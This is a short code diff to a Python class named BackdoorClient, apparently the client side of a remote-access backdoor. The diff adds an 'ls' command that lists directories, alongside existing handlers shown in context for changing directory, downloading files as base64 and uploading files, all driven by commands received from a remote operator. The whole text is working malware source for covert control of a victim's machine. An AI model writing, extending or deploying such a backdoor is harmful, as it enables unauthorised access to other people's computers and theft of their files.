@@ -68,7 +68,12 @@ class BackdoorClient:
 	def execute_cd_command(self,directory):
 		os.chdir(directory)
 		return "Cd to " + directory
-
+	
+	def execute_command(self):
+		ls = os.listdir()
+		return ls
+		
+	
 	def get_file_contents(self,path):
 		with open(path,"rb") as my_file:
 			return base64.b64encode(my_file.read())
@@ -105,6 +110,8 @@ class BackdoorClient:
 					exit()
 				elif command[0] == "cd" and len(command) > 1:
 					command_output = self.execute_cd_command(command[1])
+				elif command[0] == "ls":
+					command_output = self.execute_command()
 				elif command[0] == "download":
 					command_output = self.get_file_contents(command[1])
 				elif command[0] == "upload":
